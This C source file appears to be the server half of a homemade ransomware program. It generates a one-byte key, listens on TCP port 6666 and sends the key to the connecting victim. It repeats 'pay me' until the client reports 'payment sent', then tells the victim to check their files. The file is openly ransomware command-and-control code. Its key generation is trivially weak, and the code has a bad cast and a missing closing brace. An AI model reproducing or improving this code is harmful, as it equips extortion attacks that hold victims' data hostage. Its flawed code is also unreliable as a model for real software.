#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>

char generate_key()
{
    char key = rand() % 95;

    return key;
}

int main()
{
    srand(time(0));
    char key = generate_key();
    printf("%d\n", key);

    int server_socket; // Create socket
    int client_socket; // Uses for accepting connection
    struct sockaddr_in server_addr; // Structure requiered by the "bind()"
    char buffer[1024] = "stop inventing!!! pay me\n";
    char buffer_ok[1024] = "good, check your files. Bye!!";
    char recv_buffer[1024];

    server_socket = socket(AF_INET, SOCK_STREAM, 0); //Creates tcp socket
    server_addr.sin_family = AF_INET; // Declaring the type
    server_addr.sin_port = htons(6666); // Declaring the port number to listen on
    server_addr.sin_addr.s_addr = inet_addr("192.168.100.68"); // Declaring the host

    bind(server_socket, (struct server_addr*) &server_addr, sizeof(server_addr)); // Bind the server
    listen(server_socket, 5);

    // Keep server running indefinitely
    while (1)
    {
        if(client_socket = accept(server_socket, NULL, NULL))
        {
            printf("Client connected\n");
            ssize_t size = send(client_socket, &key, sizeof(char), 0);
            printf("%d\n", size);

            // Print "( ° ʖ °)╭∩╮" each time a message is received from the client
            while (recv(client_socket, recv_buffer, sizeof(recv_buffer), 0) > 0)
            {
                printf("( ° ʖ °)╭∩╮\n");
                printf("Client response:%s", recv_buffer);
                send(client_socket, buffer, sizeof(buffer),0);
                if (strcmp(recv_buffer, "payment sent\n") == 0)
                {
                    send(client_socket, buffer_ok, sizeof(buffer_ok), 0);
                    //printf("Client response:%s", recv_buffer);
                    break;
                }
            }
        }

        break;
    }

    return 0;